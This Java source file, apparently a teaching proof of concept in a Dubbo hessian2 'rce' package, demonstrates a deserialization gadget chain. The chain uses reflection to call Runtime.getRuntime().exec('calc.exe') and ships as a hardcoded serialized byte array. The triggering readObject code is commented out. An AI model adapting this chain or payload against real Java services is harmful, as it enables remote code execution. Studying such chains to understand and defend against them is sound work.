package org.apache.dubbo.common.serialize.hessian2.rce;

import java.io.*;

public class ReflectionPlay implements Serializable{
    private static final long serialVersionUID = -5809782578272943999L;



    public static void main(String[] args) throws Exception {
        new ReflectionPlay().run();
    }

    public void run() throws Exception {
//        byte[] ObjectBytes=serialize(getObject());
//        deserialize(ObjectBytes);
//        String str = "byte[] by = new byte[]{";
//        for (byte objectByte : ObjectBytes) {
//            str = str + objectByte + ",";
//        }
//        str = str + "};";
//        System.out.println(str);
        byte[] by = new byte[]{-84,-19,0,5,115,114,0,72,111,114,103,46,97,112,97,99,104,101,46,100,117,98,98,111,46,99,111,109,109,111,110,46,115,101,114,105,97,108,105,122,101,46,104,101,115,115,105,97,110,50,46,114,99,101,46,82,101,102,108,101,99,116,105,111,110,80,108,97,121,36,82,101,97,100,79,98,106,101,99,116,38,113,-41,121,60,-74,-64,-22,2,0,2,76,0,16,114,101,102,108,101,99,116,105,111,110,67,104,97,105,110,115,116,0,80,76,111,114,103,47,97,112,97,99,104,101,47,100,117,98,98,111,47,99,111,109,109,111,110,47,115,101,114,105,97,108,105,122,101,47,104,101,115,115,105,97,110,50,47,114,99,101,47,82,101,102,108,101,99,116,105,111,110,80,108,97,121,36,82,101,102,108,101,99,116,105,111,110,67,104,97,105,110,115,59,76,0,6,116,104,105,115,36,48,116,0,63,76,111,114,103,47,97,112,97,99,104,101,47,100,117,98,98,111,47,99,111,109,109,111,110,47,115,101,114,105,97,108,105,122,101,47,104,101,115,115,105,97,110,50,47,114,99,101,47,82,101,102,108,101,99,116,105,111,110,80,108,97,121,59,120,112,115,114,0,78,111,114,103,46,97,112,97,99,104,101,46,100,117,98,98,111,46,99,111,109,109,111,110,46,115,101,114,105,97,108,105,122,101,46,104,101,115,115,105,97,110,50,46,114,99,101,46,82,101,102,108,101,99,116,105,111,110,80,108,97,121,36,82,101,102,108,101,99,116,105,111,110,67,104,97,105,110,115,-3,-45,79,119,42,111,80,-86,2,0,3,76,0,11,102,105,114,115,116,79,98,106,101,99,116,116,0,18,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,91,0,17,114,101,102,108,101,99,116,105,111,110,79,98,106,101,99,116,115,116,0,81,91,76,111,114,103,47,97,112,97,99,104,101,47,100,117,98,98,111,47,99,111,109,109,111,110,47,115,101,114,105,97,108,105,122,101,47,104,101,115,115,105,97,110,50,47,114,99,101,47,82,101,102,108,101,99,116,105,111,110,80,108,97,121,36,82,101,102,108,101,99,116,105,111,110,79,98,106,101,99,116,59,76,0,6,116,104,105,115,36,48,113,0,126,0,2,120,112,118,114,0,17,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,0,0,0,0,0,0,0,0,0,0,0,120,112,117,114,0,81,91,76,111,114,103,46,97,112,97,99,104,101,46,100,117,98,98,111,46,99,111,109,109,111,110,46,115,101,114,105,97,108,105,122,101,46,104,101,115,115,105,97,110,50,46,114,99,101,46,82,101,102,108,101,99,116,105,111,110,80,108,97,121,36,82,101,102,108,101,99,116,105,111,110,79,98,106,101,99,116,59,-95,7,-55,-13,31,-119,-17,-113,2,0,0,120,112,0,0,0,3,115,114,0,78,111,114,103,46,97,112,97,99,104,101,46,100,117,98,98,111,46,99,111,109,109,111,110,46,115,101,114,105,97,108,105,122,101,46,104,101,115,115,105,97,110,50,46,114,99,101,46,82,101,102,108,101,99,116,105,111,110,80,108,97,121,36,82,101,102,108,101,99,116,105,111,110,79,98,106,101,99,116,-68,-32,-83,91,-113,-36,9,-15,2,0,4,91,0,4,97,114,103,115,116,0,19,91,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,76,0,10,109,101,116,104,111,100,78,97,109,101,116,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,91,0,10,112,97,114,97,109,84,121,112,101,115,116,0,18,91,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,76,0,6,116,104,105,115,36,48,113,0,126,0,2,120,112,117,114,0,19,91,76,106,97,118,97,46,108,97,110,103,46,79,98,106,101,99,116,59,-112,-50,88,-97,16,115,41,108,2,0,0,120,112,0,0,0,2,116,0,10,103,101,116,82,117,110,116,105,109,101,117,114,0,18,91,76,106,97,118,97,46,108,97,110,103,46,67,108,97,115,115,59,-85,22,-41,-82,-53,-51,90,-103,2,0,0,120,112,0,0,0,0,116,0,9,103,101,116,77,101,116,104,111,100,117,113,0,126,0,20,0,0,0,2,118,114,0,16,106,97,118,97,46,108,97,110,103,46,83,116,114,105,110,103,-96,-16,-92,56,122,59,-77,66,2,0,0,120,112,118,113,0,126,0,20,115,114,0,61,111,114,103,46,97,112,97,99,104,101,46,100,117,98,98,111,46,99,111,109,109,111,110,46,115,101,114,105,97,108,105,122,101,46,104,101,115,115,105,97,110,50,46,114,99,101,46,82,101,102,108,101,99,116,105,111,110,80,108,97,121,-81,95,-127,-122,-49,-55,-64,-127,2,0,0,120,112,115,113,0,126,0,12,117,113,0,126,0,17,0,0,0,2,112,117,113,0,126,0,17,0,0,0,0,116,0,6,105,110,118,111,107,101,117,113,0,126,0,20,0,0,0,2,118,114,0,16,106,97,118,97,46,108,97,110,103,46,79,98,106,101,99,116,0,0,0,0,0,0,0,0,0,0,0,120,112,118,113,0,126,0,17,113,0,126,0,28,115,113,0,126,0,12,117,113,0,126,0,17,0,0,0,1,116,0,8,99,97,108,99,46,101,120,101,116,0,4,101,120,101,99,117,113,0,126,0,20,0,0,0,1,113,0,126,0,25,113,0,126,0,28,113,0,126,0,28,113,0,126,0,28,};
        deserialize(by);

    }
//
//    //在此方法中返回恶意对象
//    public Object getObject() {
//        String command = "calc.exe";
//        Object firstObject = Runtime.class;
//        ReflectionObject[] reflectionChains = {
//                //调用 Runtime.class 的getMethod方法,寻找 getRuntime方法，得到一个Method对象(getRuntime方法)
//                //等同于 Runtime.class.getMethod("getRuntime",new Class[]{String.class,Class[].class})
//                new ReflectionObject("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
//                //调用 Method 的 invoker 方法可以得到一个Runtime对象
//                // 等同于 method.invoke(null),静态方法不用传入对象
//                new ReflectionObject("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
//                //调用RunTime对象的exec方法,并将 command作为参数执行命令
//                new ReflectionObject("exec", new Class[]{String.class}, new Object[]{command})
//        };
//
//        return new ReadObject(new ReflectionChains(firstObject, reflectionChains));
//    }

    /*
     * 序列化对象到byte数组
     * */
    public byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    /*
     * 从byte数组中反序列化对象
     * */
    public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

    /*
     * 一个模拟拥有漏洞的类，主要提供的功能是根据自己的属性中的值来进行反射调用
     * */
    class ReflectionObject implements Serializable{
        private String methodName;
        private Class[] paramTypes;
        private Object[] args;

        public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) {
            this.methodName = methodName;
            this.paramTypes = paramTypes;
            this.args = args;
        }

        //根据  methodName, paramTypes 来寻找对象的方法，利用 args作为参数进行调用
        public Object transform(Object input) throws Exception {
            Class inputClass = input.getClass();
            return inputClass.getMethod(methodName, paramTypes).invoke(input, args);
        }
    }

    /*
     * 一个用来模拟提供恶意代码的类,
     * 主要的功能是将 ReflectionObject进行串联调用,与ReflectionObject一起构成漏洞代码的一部分
     * */
    class ReflectionChains implements Serializable {

        private Object firstObject;
        private ReflectionObject[] reflectionObjects;

        public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) {
            this.firstObject = firstObject;
            this.reflectionObjects = reflectionObjects;
        }

        public Object execute() throws Exception {
            Object concurrentObject = firstObject;
            for (ReflectionObject reflectionObject : reflectionObjects) {
                concurrentObject = reflectionObject.transform(concurrentObject);
            }
            return concurrentObject;
        }
    }

    /**
     * 一个等待序列化的类,拥有一个属性和一个重写了的readObject方法
     * 并且在readObject方法中执行了该属性的一个方法
     * */
    class ReadObject implements Serializable {

        private ReflectionChains reflectionChains;

        public ReadObject(ReflectionChains reflectionChains) {
            this.reflectionChains = reflectionChains;
        }
        //当反序列化的时候，这个代码会被调用
        //该方法被调用的时候其属性都是空
        // 在ObjectStreamClass类中会虚招反序列化类中的readObject方法， 并调用
        private void readObject(java.io.ObjectInputStream stream)
                throws IOException, ClassNotFoundException {
//            try {
//                //用来模拟当readObject的时候，对自身的属性进行了一些额外的操作
//                reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null);
//                reflectionChains.execute();
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
            System.out.println("hahahhahahh");
        }
    }
}